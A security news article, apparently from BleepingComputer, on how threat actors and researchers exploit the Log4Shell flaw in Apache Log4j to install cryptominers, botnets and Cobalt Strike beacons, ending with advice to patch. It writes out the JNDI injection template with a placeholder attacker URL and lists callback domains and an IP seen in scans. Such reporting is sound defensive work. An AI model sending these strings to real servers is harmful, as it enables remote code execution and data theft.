@@ -1,0 +1,248 @@
+
+	   
+
+Source: Kevin Beaumont
+
+Threat actors and researchers are scanning for and exploiting the Log4j Log4Shell vulnerability to deploy malware or find vulnerable servers. In this article, we have compiled the known payloads, scans, and attacks using the Log4j vulnerability.
+
+Early Friday morning, an exploit was publicly released for a critical zero-day vulnerability dubbed 'Log4Shell' in the Apache Log4j Java-based logging platform used to access web server and application logs.
+
+To exploit this vulnerability, a threat actor can change their web browser's user agent and visit a site or search for a string on a website using the format ${jndi:ldap://[attacker_URL]}. Doing so will cause the string to be appended to the web server's access logs.
+
+When the Log4j application parses these logs and encounters the string, the bug will force the server to make a callback, or request, to the URL listed in the JNDI string. Threat actors can then use that URL to pass Base64-encoded commands or Java classes to execute on the vulnerable device. 
+
+
+1/1
+
+
+
+
+
+Skip Ad
+ 
+Continue watchingafter the adVisit Advertiser websiteGO TO PAGE.cnx-non-linear-ad-container .cnx-ad-bid-slot{position:absolute;top:0;left:0;grid-area:adslot;opacity:0;background:none;width:100%;height:100%}.cnx-non-linear-ad-container .cnx-ad-bid-slot.cnx-ad-bid-slot-selected{opacity:1;z-index:10}.cnx-non-linear-ad-container .cnx-ad-slot{display:flex;position:absolute;top:0;left:0;justify-content:center;align-items:center;width:100%;height:100%;overflow:hidden}.cnx-non-linear-ad-container .cnx-ad-slot video,.cnx-non-linear-ad-container video.cnx-ad-slot{background-color:unset}.cnx-ad-container .cnx-ad-bid-slot{position:absolute;top:0;left:0;grid-area:adslot;opacity:0;background:#f4f4f4;width:100%;height:100%}.cnx-ad-container .cnx-ad-bid-slot.cnx-ad-bid-slot-selected{opacity:1;z-index:10}.cnx-ad-container .cnx-ad-slot{display:flex;position:absolute;top:0;left:0;justify-content:center;align-items:center;width:100%;height:100%;overflow:hidden}.cnx-ad-container .cnx-ad-slot div{background-color:rgba(0,0,0,0) !important}.cnx-ad-container .cnx-ad-slot iframe{box-sizing:border-box;border:3px solid #fff !important;color-scheme:none}.cnx-ad-container .cnx-ad-slot iframe:not([id]){border:none !important}.cnx-ad-container .cnx-ad-slot-video-type iframe{border:none !important}.cnx-ad-container .cnx-ad-slot video,.cnx-ad-container video.cnx-ad-slot{background-color:#f4f4f4}Furthermore, just forcing the connection to the remote server is used to determine if a server is vulnerable to the Log4shell vulnerability.
+
+While Apache quickly released Log4j 2.15.0 to resolve the vulnerability, threat actors had already started to scan for and exploit vulnerable servers to exfiltrate data, install malware, or take over the server.
+
+As this software is used in thousands of enterprise applications and websites, there is significant concern that it will lead to widespread attacks and malware deployment.
+
+Below we outline the known attacks currently exploiting the Log4j vulnerability.
+
+Log4Shell used to install malware
+
+When an easily exploitable remote code execution vulnerability is disclosed, malware distributors are usually the first to begin utilizing it.
+
+Below we have compiled the known malware payloads exploiting Log4j from BleepingComputer web server access logs, GreyNoise data, and reports from researchers.
+
+Cryptominers
+
+As soon as the vulnerability was released, we saw threat actors exploiting the Log4Shell vulnerability to execute shell scripts that download and install various cryptominers, as shown below.
+
+The threat actors behind the Kinsing backdoor and cryptomining botnet are heavily abusing the Log4j vulnerability with Base64 encoded payloads that have the vulnerable server download and execute shell scripts.
+
+
+Kinsing Log4Shell exploit and decoded commandsSource: BleepingComputer
+
+This shell script will remove competing malware from the vulnerable device and then download and install the Kinsing malware, which will begin mining for cryptocurrency.
+
+
+Kinsing installer scriptSource: BleepingComputer
+
+Other Log4Shell exploits seen by BleepingComputer to be installing miners can be seen in the image below.
+
+
+Other malicious cryptominer installers
+
+Mirai and  Muhstik botnets
+
+Netlab 360 reports that the threat actors exploit the vulnerability to install the Mirai and Muhstik malware on vulnerable devices.
+
+These malware families recruit IoT devices and servers into their botnets and use them to deploy cryptominers and perform large-scale DDoS attacks.
+
+"This morning we got the first answers, our Anglerfish and Apacket honeypots have caught 2 waves of attacks using the Log4j vulnerability to form botnets, and a quick sample analysis showed that they were used to form Muhstik and Mirai botnets respectively, both targeting Linux devices," explains Netlab 360 researchers.
+
+Cobalt Strike Beacons
+
+The Microsoft Threat Intelligence Center reported that the Log4j vulnerabilities are also being exploited to drop Cobalt Strike beacons.
+
+Cobalt Strike is a legitimate penetration testing toolkit where red teamers deploy agents, or beacons, on "compromised" devices to perform remote network surveillance or execute further commands.
+
+However, threat actors commonly use cracked versions of Cobalt Strike as part of network breaches and during ransomware attacks. 
+
+Scanning and information disclosure
+
+In addition to using the Log4Shell exploits to install malware, threat actors and security researchers are using the exploit to scan for vulnerable servers and exfiltrate information from them.
+
+As you can see below, researchers use the exploit to force vulnerable servers to access URLs or perform DNS requests for callback domains. This allows the researchers or threat actors to determine if the server is vulnerable and use it for future attacks, research, or attempts to claim a bug bounty award.
+
+Some researchers may be going a step too far by using the exploit to exfiltrate environment variables that contain server data without permission, including the host's name, the user name the Log4j service is running under, the operating system name, and OS version number.
+
+
+Researchers and threat actors scanning for vulnerable serversSource: BleepingComputer
+
+The most common domains or IP addresses used as part of the scanning are/or data exfiltration campaigns are:
+
+interactsh.com
+burpcollaborator.net
+dnslog.cn
+bin${upper:a}ryedge.io
+leakix.net
+bingsearchlib.com
+205.185.115.217:47324
+bingsearchlib.com:39356
+canarytokens.com
+
+Of particular interest is the bingsearchlib.com domain, which is being used heavily as a callback for Log4j exploits. However, a security researcher told BleepingComputer that while the domain was being used as an exploit callback, bingsearchlib.com was not registered.
+
+The security researcher said they registered the domain to prevent threat actors from abusing it but are not logging requests.
+
+Threat intelligence company GreyNoise shows that IP addresses using the bingsearchlib.com callback also commonly use a Log4Shell callback of 205.185.115.217:47324.
+
+Another domain we have seen heavily used in Log4j vulnerability scans is the 'psc4fuel.com' domain. After publishing this article, a cybersecurity company contacted us to state it was there 
+
+For unknown attacks, BleepingComputer has seen repeated requests from a domain named psc4fuel.com attempting to exploit our website. This domain appears appears very similar to the legitimate psc4fuel.com domain belonging to a petroleum services company.psc4fuel.com domain.
+
+
+psc4fuel.com domain used in Log4j attacksSource: BleepingComputer
+
+After publishing this story, BleepingComputer was contacted by a cybersecurity company who states that the domain belongs to them, that no Java classes are being pushed by the URLs, and they do not accept connections at the URL.
+
+As for the similarities of the domain, they told us that the domain is not intentionally impersonating the petroleum company.
+
+While there has been no public research showing that ransomware gangs or other threat actors utilize the Log4j exploit, the fact that Cobalt Strike beacons have been deployed means these attacks are imminent.
+
+Due to this, it is imperative that all users install the latest version of Log4j or affected applications to resolve this vulnerability as soon as possible.
+
+If you know of other malware campaigns exploiting the Log4j vulnerability, please let us know via Signal at 646-961-3731, Twitter, or our contact form so we can add the information to this article.
+
+Update 12/12/21 9:50 PM EST: Added Cobalt Strike beacons detected by Microsoft.
+Update 12/14/21 11:00 AM EST: Updated story with more information about the pscfuel.com domain.
+
+	   
+
+.ia_ad {
+    background-color: #f0f6ff;
+    width: 95%;
+    max-width: 800px;
+    margin: 15px auto;
+    border-radius: 8px;
+    border: 1px solid #d6ddee;
+    display: flex;
+    align-items: stretch;
+    padding: 0;
+    overflow: hidden;
+}
+
+.ia_lef {
+    flex: 1;
+    max-width: 200px;
+    height: auto;
+    display: flex;
+    align-items: stretch;
+}
+
+.ia_lef a {
+    display: flex;
+    width: 100%;
+    height: 100%;
+}
+
+
+.ia_lef a img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    border-radius: 8px 0 0 8px;
+    margin: 0;
+    display: block;
+}
+
+.ia_rig {
+    flex: 2;
+    padding: 10px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+}
+
+.ia_rig h2 {
+    font-size: 17px !important;
+    font-weight: 700;
+    color: #333;
+    line-height: 1.4;
+    font-family: Georgia, "Times New Roman", Times, serif;
+    margin: 0 0 14px 0;
+}
+
+.ia_rig p {
+    font-weight: bold;
+    font-size: 14px;
+    margin: 0 0 clamp(6px, 2vw, 14px) 0;
+}
+
+.ia_button {
+    background-color: #FFF;
+    border: 1px solid #3b59aa;
+    color: black;
+    text-align: center;
+    text-decoration: none;
+    border-radius: 8px;
+    display: inline-block;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    padding: 10px 20px;
+    width: fit-content;
+}
+
+.ia_button a {
+    text-decoration: none;
+    color: inherit;
+    display: block;
+}
+
+@media (max-width: 600px) {
+    .ia_ad {
+        flex-direction: column;
+        align-items: center;
+    }
+
+    .ia_lef {
+        max-width: 100%;
+    }
+
+    .ia_lef a img {
+        border-radius: 8px 8px 0 0;
+    }
+
+
+    .ia_rig {
+        padding: 15px;
+        width: 100%;
+    }
+
+    .ia_button {
+        width: 100%;
+	margin: 0px auto;
+    }
+}
+
+    
+        
+            
+    
+    
+        Red Report 2025: Analyzing the Top ATT&CK Techniques Used by 93% of Malware 
+Malware targeting password stores surged 3X as attackers executed stealthy Perfect Heist scenarios, infiltrating and exploiting critical systems.
+Discover the top 10 MITRE ATT&CK techniques behind 93% of attacks and how to defend against them.
+        Read the Red Report 2025
+    
+
+
+           
+          
+            Related Articles:
+	     Hackers exploit SAP NetWeaver bug to deploy Linux Auto-Color malwareExploit available for critical Cisco ISE bug exploited in attacksDanaBot malware operators exposed via C2 bug added in 2022SonicWall warns of critical access control flaw in SonicOSSonicWall SSLVPN access control flaw is now exploited in attacks
+	  
+ 
+	  
